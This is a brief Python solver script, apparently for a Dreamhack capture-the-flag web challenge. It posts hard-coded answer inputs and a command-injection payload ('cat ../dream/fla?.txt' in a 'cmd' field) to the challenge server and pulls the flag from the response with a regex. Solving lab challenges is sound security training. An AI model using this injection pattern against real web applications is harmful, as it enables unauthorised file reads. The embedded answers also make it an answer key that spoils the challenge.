import requests
import re

URL = "http://host3.dreamhack.games:23908"

payload = {
    'input1': 'dnnyangyang0310',
    'input2': '0@00319!+1+13',
    'cmd': 'cat ../dream/fla?.txt'
}


res = requests.post(URL+'/step2.php', data=payload)
match = re.search(r'DH\{[^}]*\}', res.text)
print(match.group(0))
